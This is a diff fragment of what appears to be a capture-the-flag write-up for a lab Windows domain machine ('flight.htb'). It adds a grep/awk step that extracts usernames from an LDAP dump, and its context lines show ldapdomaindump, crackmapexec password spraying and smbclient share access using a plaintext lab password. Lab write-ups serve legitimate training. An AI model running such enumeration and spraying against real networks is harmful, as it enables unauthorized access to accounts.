@@ -76,6 +76,11 @@ ldapdomaindump -u flight\\svc_apache -p 'S@Ss!K@*t13' 10.10.11.187
 ![image](https://github.com/user-attachments/assets/dcc8cf1f-0451-40b7-adb8-519e15e6fa2a)
 
 ```
+cat domain_users.grep | grep "Domain Users" | awk -F' ' '{print $1}'
+```
+![image](https://github.com/user-attachments/assets/35ea9369-f4c7-4d9d-af70-c7aa79dbf8f3)
+
+```
 crackmapexec smb 10.10.11.187 -u users_all2 -p 'S@Ss!K@*t13'
 smbclient \\\\10.10.11.187\\Users -U flight.htb/S.Moon
 ```
